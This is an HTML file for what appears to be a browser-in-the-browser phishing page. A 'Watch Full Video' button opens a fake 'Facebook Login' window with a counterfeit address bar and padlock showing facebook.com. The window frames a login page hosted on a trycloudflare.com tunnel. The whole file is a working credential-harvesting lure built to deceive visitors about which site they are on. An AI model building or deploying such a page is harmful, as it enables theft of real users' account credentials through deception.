<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="style.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
<button id="clickme" style="margin-left:auto; margin-right: auto; margin-top: 2.5%; text-align: center; display: block;">Watch Full Video</button>
<div id="window" style="margin:auto; position: relative; bottom: 2.5%; display: none;">
<!-- Title bar start -->
<div id="title-bar-width">
	<div id="title-bar">
		<div style="margin-top:5px;">
			<img src="icons8-facebook-16.png" width="20px" height="15px" id="logo">
			<span id="logo-description">Facebook Login</span>
		</div>

		<div>
			<span id="minimize">&#8212;</span>
			<span id="square">□</span>
			<span id="exit">✕</span>
		</div>
	</div>
	<div id="url-bar">
		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
		<span id="domain-name"></span>
		<span id="domain-path">https://www.facebook.com/</span>
	</div>
	<div>
		<iframe id="content" src="https://basket-definitions-malta-pets.trycloudflare.com/login.html.php" frameBorder="0"></iframe>
	</div>
	
</body>
<script src="script.js"></script>
</html>
